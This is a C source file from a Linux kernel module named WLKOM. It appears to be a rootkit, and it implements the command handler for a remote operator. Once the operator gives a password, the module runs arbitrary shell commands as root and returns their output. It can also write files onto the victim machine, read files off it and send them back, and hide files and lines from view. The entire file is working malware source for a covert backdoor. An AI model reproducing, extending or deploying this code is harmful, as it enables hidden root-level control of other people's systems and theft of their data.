#include "commands.h"

#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/umh.h>

#include "hide.h"

#define TMP_OUTPUT  "/tmp/.wlkom_out"
#define CMD_BUFSIZE 512

/**
 * @brief Reads TMP_OUTPUT into a heap buffer after a command execution.
 * @param output      Output: allocated buffer with file content (caller kfree).
 * @param output_len  Output: number of bytes read.
 */
static void read_tmp_output(char **output, size_t *output_len)
{
    struct file *f;
    loff_t       size;
    loff_t       pos;

    f = filp_open(TMP_OUTPUT, O_RDONLY, 0);
    if (IS_ERR(f))
    {
        *output     = kstrdup("", GFP_KERNEL);
        *output_len = 0;
        return;
    }
    size = i_size_read(file_inode(f));
    if (size <= 0)
    {
        filp_close(f, NULL);
        *output     = kstrdup("", GFP_KERNEL);
        *output_len = 0;
        return;
    }
    *output = kmalloc(size + 1, GFP_KERNEL);
    if (!*output)
    {
        filp_close(f, NULL);
        *output_len = 0;
        return;
    }
    pos         = 0;
    *output_len = kernel_read(f, *output, size, &pos);
    if (*output_len > 0)
        (*output)[*output_len] = '\0';
    filp_close(f, NULL);
}

/**
 * @brief Executes a shell command via usermodehelper and captures stdout/stderr.
 *        If command has redirection (>, |), executes directly without capture.
 *        Otherwise, captures output to /tmp/.wlkom_out.
 * @param cmd         Shell command string (must be null-terminated).
 * @param output      Output: heap-allocated result (caller must kfree).
 * @param output_len  Output: result length in bytes.
 */
static void exec_command(const char *cmd, char **output, size_t *output_len)
{
    char  *full_cmd;
    char  *argv[4];
    char  *envp[3];
    char  *rm_argv[4];
    int    has_redirect;

    *output     = NULL;
    *output_len = 0;

    if (!cmd || strlen(cmd) == 0)
    {
        *output = kstrdup("", GFP_KERNEL);
        return;
    }

    full_cmd = kmalloc(CMD_BUFSIZE, GFP_KERNEL);
    if (!full_cmd)
        return;

    has_redirect = (strchr(cmd, '>') != NULL) || (strchr(cmd, '|') != NULL);

    if (has_redirect)
    {
        snprintf(full_cmd, CMD_BUFSIZE, "%s", cmd);
    }
    else
    {
        snprintf(full_cmd, CMD_BUFSIZE, "%s > %s 2>&1", cmd, TMP_OUTPUT);
    }

    argv[0] = "/bin/sh";
    argv[1] = "-c";
    argv[2] = full_cmd;
    argv[3] = NULL;

    envp[0] = "HOME=/";
    envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
    envp[2] = NULL;

    if (has_redirect)
        pr_info("WLKOM exec: redirect detected, executing: %s\n", full_cmd);

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    if (!has_redirect)
    {
        read_tmp_output(output, output_len);
        rm_argv[0] = "/bin/rm";
        rm_argv[1] = "-f";
        rm_argv[2] = TMP_OUTPUT;
        rm_argv[3] = NULL;
        call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
    }
    else
    {
        *output = kstrdup("OK", GFP_KERNEL);
        *output_len = 2;
        pr_info("WLKOM exec: redirect completed\n");
    }

    kfree(full_cmd);
}

/**
 * @brief Handles CMD_AUTH: verifies the password and sets ctx->authed.
 * @param ctx      Connection context.
 * @param payload  Received password string.
 * @param len      Password length.
 * @return 0 on success, -1 on bad password.
 */
static int handle_auth(conn_ctx_t *ctx, char *payload, uint32_t len)
{
    if (len == 0 || !ctx->password || strncmp(payload, ctx->password, len) != 0)
    {
        pr_warn("WLKOM commands: bad password\n");
        send_packet(ctx, CMD_AUTH, "FAIL", 4);
        return -1;
    }
    ctx->authed = true;
    send_packet(ctx, CMD_AUTH, "OK", 2);
    pr_info("WLKOM commands: authenticated\n");
    return 0;
}

/**
 * @brief Handles CMD_EXEC: runs payload as a shell command and sends output.
 * @param ctx      Connection context.
 * @param payload  Null-terminated command string.
 */
static void handle_exec(conn_ctx_t *ctx, char *payload)
{
    char  *output;
    size_t output_len;

    if (!payload)
        return;
    exec_command(payload, &output, &output_len);
    send_packet(ctx, CMD_EXEC, output ? output : "", output_len);
    kfree(output);
}

/**
 * @brief Handles CMD_UPLOAD: writes a file on the victim.
 *        Payload format: [remote_path\0][file_data].
 * @param ctx      Connection context.
 * @param payload  Raw payload buffer.
 * @param len      Total payload length.
 */
static void handle_upload(conn_ctx_t *ctx, char *payload, uint32_t len)
{
    const char  *path;
    const char  *data;
    size_t       path_len;
    size_t       data_len;
    struct file *f;
    loff_t       pos;

    if (!payload || len == 0)
        return;
    path_len = strnlen(payload, len);
    if (path_len >= len)
        return;
    path     = payload;
    data     = payload + path_len + 1;
    data_len = len - path_len - 1;
    f        = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f))
    {
        send_packet(ctx, CMD_UPLOAD, "FAIL", 4);
        return;
    }
    pos = 0;
    kernel_write(f, data, data_len, &pos);
    filp_close(f, NULL);
    send_packet(ctx, CMD_UPLOAD, "OK", 2);
}

/**
 * @brief Handles CMD_DOWNLOAD: reads a file from the victim and sends it.
 * @param ctx      Connection context.
 * @param payload  Null-terminated remote file path.
 */
static void handle_download(conn_ctx_t *ctx, char *payload)
{
    struct file *f;
    loff_t       size;
    char        *buf;
    loff_t       pos;

    if (!payload)
        return;
    f = filp_open(payload, O_RDONLY, 0);
    if (IS_ERR(f))
    {
        send_packet(ctx, CMD_DOWNLOAD, "FAIL", 4);
        return;
    }
    size = i_size_read(file_inode(f));
    buf  = kmalloc(size, GFP_KERNEL);
    if (!buf)
    {
        filp_close(f, NULL);
        send_packet(ctx, CMD_DOWNLOAD, "FAIL", 4);
        return;
    }
    pos = 0;
    kernel_read(f, buf, size, &pos);
    filp_close(f, NULL);
    send_packet(ctx, CMD_DOWNLOAD, buf, size);
    kfree(buf);
}

/**
 * @brief Extracts basename from a path (everything after the last '/').
 * @param path  Full path or basename.
 * @return Pointer to the basename within @p path.
 */
static const char *get_basename(const char *path)
{
    const char *slash = strrchr(path, '/');

    return slash ? slash + 1 : path;
}

/**
 * @brief Wrapper: extract basename from path, then hide the file.
 * @param path  Full path or basename of file to hide.
 */
static void handle_hide_file_wrapper(const char *path)
{
    if (path)
        hide_file(get_basename(path));
}

/**
 * @brief Wrapper: extract basename from path, then unhide the file.
 * @param path  Full path or basename of file to unhide.
 */
static void handle_unhide_file_wrapper(const char *path)
{
    if (path)
        unhide_file(get_basename(path));
}

/**
 * @brief Handles CMD_HIDE_LINE / CMD_UNHIDE_LINE.
 *        Payload format: [filename\0][pattern].
 * @param ctx      Connection context.
 * @param payload  Raw payload buffer.
 * @param len      Total payload length.
 * @param hide     true to hide, false to unhide.
 */
static void handle_hide_line(conn_ctx_t *ctx, char *payload, uint32_t len,
                              bool hide)
{
    size_t fname_len;

    (void)ctx;
    if (!payload)
        return;
    fname_len = strnlen(payload, len);
    if (fname_len >= len)
        return;
    if (hide)
        hide_line(payload, payload + fname_len + 1);
    else
        unhide_line(payload, payload + fname_len + 1);
}

int handle_packet(conn_ctx_t *ctx, uint8_t opcode, char *payload, uint32_t len)
{
    if (opcode != CMD_AUTH && !ctx->authed)
    {
        pr_warn("WLKOM commands: unauthenticated command, dropping\n");
        return 0;
    }
    switch (opcode)
    {
    case CMD_AUTH:        return handle_auth(ctx, payload, len);
    case CMD_PING:        send_packet(ctx, CMD_PONG, NULL, 0);              break;
    case CMD_EXEC:        handle_exec(ctx, payload);                         break;
    case CMD_UPLOAD:      handle_upload(ctx, payload, len);                  break;
    case CMD_DOWNLOAD:    handle_download(ctx, payload);                     break;
    case CMD_HIDE_FILE:   handle_hide_file_wrapper(payload);                break;
    case CMD_UNHIDE_FILE: handle_unhide_file_wrapper(payload);              break;
    case CMD_HIDE_LINE:   handle_hide_line(ctx, payload, len, true);        break;
    case CMD_UNHIDE_LINE: handle_hide_line(ctx, payload, len, false);       break;
    default:
        pr_warn("WLKOM commands: unknown opcode 0x%02x\n", opcode);
        break;
    }
    return 0;
}
